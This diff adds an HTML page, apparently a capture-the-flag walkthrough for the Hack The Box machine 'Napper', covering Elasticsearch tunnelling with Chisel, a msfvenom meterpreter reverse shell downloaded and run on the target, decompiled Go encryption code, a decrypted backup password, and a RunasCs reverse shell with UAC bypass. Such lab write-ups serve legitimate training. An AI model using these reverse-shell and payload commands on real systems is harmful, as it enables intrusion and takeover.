@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <link rel="stylesheet" href="../../css/Font.css">
+        <link rel="stylesheet" href="css/code.css">
+        <link rel="stylesheet" href="../../css/prism.css">
+        <script src="../../js/prism.js"></script>
+        <script src="js/copycode.js"></script>
+        <script type="module"
+            src="https://unpkg.com/@deckdeckgo/highlight-code@latest/dist/deckdeckgo-highlight-code/deckdeckgo-highlight-code.esm.js"></script>
+    </head>
+    <body>
+
+        <pre>
+
+            <img src="../../public/images/Napper/Napper-1.png"/>
+
+            Get login data for elasticsearch
+
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                        C:\> cd C:\Temp\www\internal\content\posts\internal-laps-alpha
+                        C:\Temp\www\internal\content\posts\internal-laps-alpha> type .env
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            <b>
+                Fordward elasticsearch
+            </b>
+
+            To forward requests to Elasticsearch, set up a tunnel using Chisel. Replace
+            < YOUR_IP> with your actual IP address:
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                        chisel client < YOUR_IP>:1118 R:9200:127.0.0.1:9200
+                        ┌──(kali㉿kali)-[~]
+                        └─$ chisel server --reverse --port 1118
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            checkout
+            <a href=" https://127.0.0.1:9200/user-00001/_search and https://127.0.0.1:9200/seed/_search">
+                https://127.0.0.1:9200/user-00001/_search and https://127.0.0.1:9200/seed/_search
+            </a>
+
+            to get seed and backup user blob (both
+            can be used just once and maybe must be reloaded)
+
+            <img src="../../public/images/Napper/Napper-2.png"/>
+
+            <b>
+                Create Reverse Shell
+            </b>
+
+            Generate a reverse shell executable with Metasploit’s msfvenom, specifying your
+            listener host and port:
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                        ┌──(kali㉿kali)-[~]
+                        └─$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.61 LPORT=1234 -f exe -o reshell.exe
+                        
+                        ┌──(kali㉿kali)-[~]
+                        └─$ python3 -m http.server 80
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            <b>
+                Download Reverse Shell and execute
+            </b>
+
+            Setup a metasploit listener
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                        ┌──(kali㉿kali)-[~]
+                        └─$ msfconsole
+                        msf6 > use exploit/multi/handler
+                        [*] Using configured payload generic/shell_reverse_tcp
+                        msf6 exploit(multi/handler) >  set LHOST 10.10.14.61
+                        LHOST => 10.10.14.61
+                        msf6 exploit(multi/handler) > set LPORT 1234
+                        LPORT => 1234
+                        msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
+                        payload => windows/x64/meterpreter/reverse_https
+                        msf6 exploit(multi/handler) > exploit
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            On the target machine, download and execute the reverse shell:
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                        PS C:\users\ruben> wget http://< YOUR_IP>/reshell.exe -O reshell.exe
+                        PS C:\users\ruben> start reshell.exe
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            With the reverse shell in place, use Metasploit to interact with the compromised
+            system and download critical executables for further analysis:
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                        meterpreter > cd C:\Temp\www\internal\content\posts\internal-laps-alpha
+                        meterpreter > background
+                        msf6 exploit(multi/handler) > sessions --interact 1 --timeout 10000
+                        meterpreter > download a.exe
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            <b>
+                Reverse Engineer Encryption Algorithm
+            </b>
+
+            We can use a tool like Ghidra Code Browser to reverse engineer the executable
+
+            <img src="../../public/images/Napper/Napper-3.png"/>
+
+            Key-Gen function:
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                        /* DWARF original prototype: void main.genKey(int seed, []uint8 ~r0)
+                        Golang function info: Flags: [], ID: NORMAL
+                        Golang source: /Users/remco/git/HTB/es_napper.go:50
+                        Golang recovered signature: undefined main.genKey(8) */
+                     
+                     []uint8 main::main.genKey(int seed)
+                     
+                     {
+                       int iVar1;
+                       int iVar2;
+                       []uint8 [Var3;
+                       []uint8 [Var4;
+                       int seed-spill;
+                       int i;
+                       
+                       while (&stack0x00000000 <= CURRENT_G.stackguard0) {
+                         runtime::runtime.morestack_noctxt();
+                       }
+                       math/rand::math/rand.(*Rand).Seed((math/rand.Rand *)math/rand.globalRand,seed);
+                       [Var3 = runtime::runtime.makeslice(&uint8___runtime._type,0x10,0x10);
+                       [Var4.array = [Var3.array;
+                       for (iVar2 = 0; iVar2 < 0x10; iVar2 = iVar2 + 1) {
+                         iVar1 = math/rand::math/rand.(*Rand).Intn(math/rand.globalRand,0xfe);
+                         [Var4.array[iVar2] = (char)iVar1 + 1;
+                       }
+                       [Var4.len = 0x10;
+                       [Var4.cap = 0x10;
+                       return [Var4;
+                     }
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            Encryption function:
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+
+                        /* DWARF original prototype: void main.encrypt([]uint8 key, string text, string ~r0)
+                        Golang function info: Flags: [], ID: NORMAL
+                        Golang source: /Users/remco/git/HTB/es_napper.go:59
+                        Golang recovered signature: undefined main.encrypt(struct? {8, 8, 8}, struct? {8, 8}) */
+                     
+                     string main::main.encrypt([]uint8 key,string text)
+                     
+                     {
+                       uint len;
+                       uint8 *puVar1;
+                       runtime.itab *prVar2;
+                       io.Reader r;
+                       crypto/cipher.Stream cVar5;
+                       string sVar6;
+                       interface_{} e;
+                       interface_{} e_00;
+                       []uint8 [Var7;
+                       []uint8 [Var8;
+                       io.ReadAtLeast_multivalue_return_type iVar9;
+                       crypto/aes.NewCipher_multivalue_return_type cVar10;
+                       []uint8 buf;
+                       []uint8 iv;
+                       []uint8 key-spill;
+                       string text-spill;
+                       int iVar3;
+                       runtime._type *prVar4;
+                       
+                       while (&stack0x00000000 <= CURRENT_G.stackguard0) {
+                         runtime::runtime.morestack_noctxt();
+                       }
+                       [Var7 = runtime::runtime.stringtoslicebyte((runtime.tmpBuf *)0x0,text);
+                       iVar3 = [Var7.len;
+                       cVar10 = crypto/aes::crypto/aes.NewCipher(key);
+                       prVar2 = cVar10.~r1;
+                       if (prVar2 != (runtime.itab *)0x0) {
+                         if (prVar2 != (runtime.itab *)0x0) {
+                           prVar4 = prVar2->_type;
+                         }
+                         else {
+                           prVar4 = (runtime._type *)0x0;
+                         }
+                         e_00.data = cVar10.~r1.data;
+                         e_00._type = prVar4;
+                                         /* WARNING: Subroutine does not return */
+                         runtime::runtime.gopanic(e_00);
+                       }
+                       len = iVar3 + 0x10;
+                       [Var8 = runtime::runtime.makeslice(&uint8___runtime._type,len,len);
+                       puVar1 = [Var8.array;
+                       if (len < 0x10) {
+                                         /* WARNING: Subroutine does not return */
+                         runtime::runtime.panicSliceAcap(puVar1,[Var8.len,0x10);
+                       }
+                       r.data = crypto/rand.Reader.data;
+                       r.tab = crypto/rand.Reader.tab;
+                       buf.len = 0x10;
+                       buf.array = puVar1;
+                       buf.cap = len;
+                       iVar9 = io::io.ReadAtLeast(r,buf,0x10);
+                       prVar4 = iVar9.err;
+                       if (prVar4 == (runtime._type *)0x0) {
+                         iv.len = 0x10;
+                         iv.array = puVar1;
+                         iv.cap = len;
+                         cVar5 = crypto/cipher::crypto/cipher.newCFB(cVar10.~r0,iv,false);
+                         (*(code *)(cVar5.tab)->fun[0])
+                                   (cVar5.data,puVar1 + ((dword)(-iVar3 >> 0x3f) & 0x10),iVar3,iVar3,[Var7.array,iVar3,
+                                    [Var7.cap);
+                         [Var7.len = len;
+                         [Var7.array = puVar1;
+                         [Var7.cap = len;
+                         sVar6 = encoding/base64::encoding/base64.(*Encoding).EncodeToString
+                                           (encoding/base64.URLEncoding,[Var7);
+                         return sVar6;
+                       }
+                       if (prVar4 != (runtime._type *)0x0) {
+                         prVar4 = (runtime._type *)prVar4->ptrdata;
+                       }
+                       e.data = iVar9.err.data;
+                       e._type = prVar4;
+                                         /* WARNING: Subroutine does not return */
+                       runtime::runtime.gopanic(e);
+                     }
+                     
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            Or use my decryption algorithm
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                        ┌──(kali㉿kali)-[~]
+                        └─$ wget https://github.com/JohannesLks/HackTheBox/blob/main/Napper/decrypt.go 
+                        
+                        ┌──(kali㉿kali)-[~]
+                        └─$ go run decrypt.go -data="ZGkRXiJVUb7eUVc7Kw0v5HGimqKdjanPdhoT9y63z7XduEOvuO5XqJx-ZOlJSfw3tOt-3ot9Jqs=" -seed=43333000
+                        Decrypted text: oBIYapFZIIhGWuNnOAeGFnYpOQeCtzJLOWAIJpJu
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            <b>
+                Get Flag
+            </b>
+
+            Further elevate your privileges and execute commands as a different user using
+            tools like RunasCs, followed by capturing the flag located on the Administrator’s desktop
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                        PS C:\users\ruben> wget http://< YOUR_IP>/RunasCs.exe -O runascs.exe
+                            PS C:\users\ruben> .\RunasCs.exe backup uxnfOTBakgNPmsNFEuYOsIBrlyRvbBhCdbQnREmc 
+                            cmd.exe -r 10.10.14.61:443 --bypass-uac
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                        ┌──(kali㉿kali)-[~]
+                        └─$ nc -lvnp 443                   
+                        listening on [any] 443 ...
+                        connect to [10.10.14.61] from (UNKNOWN) [10.129.229.166] 64078
+                        Microsoft Windows [Version 10.0.19045.3636]
+                        (c) Microsoft Corporation. All rights reserved.
+
+                        C:\Windows\system32>cd C:\Users\Administrator\Desktop
+                        C:\Users\Administrator\Desktop>type root.txt
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            
+            
+        </pre>
+    </body>
